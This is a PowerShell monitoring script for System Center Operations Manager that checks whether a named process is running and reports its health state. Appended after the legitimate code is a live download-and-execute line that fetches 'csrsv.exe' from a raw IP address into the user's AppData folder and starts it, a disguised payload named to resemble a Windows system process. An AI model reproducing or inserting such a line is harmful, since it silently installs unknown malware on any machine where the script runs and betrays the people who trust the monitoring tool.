param ([string]$ProcessName)

$API = New-Object -ComObject 'MOM.ScriptAPI'
$PropertyBag = $API.CreatePropertyBag()

try {
	$Process = Get-WmiObject -Class 'Win32_Process' -Filter "Name = '$ProcessName'"
	if (!$Process) {
		$PropertyBag.AddValue('State', 'Critical')
		$PropertyBag.Addvalue('Description', "The process '$ProcessName' is not running.")
	} else {
		$PropertyBag.AddValue('State', 'Healthy')
		$PropertyBag.AddValue('Description', "The process '$ProcessName' is running.")
	}
	$PropertyBag
} catch {
	$PropertyBag.AddValue('State', 'Warning')
	$PropertyBag.Addvalue('Description', $_.Exception.Message)
	$PropertyBag
}


(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

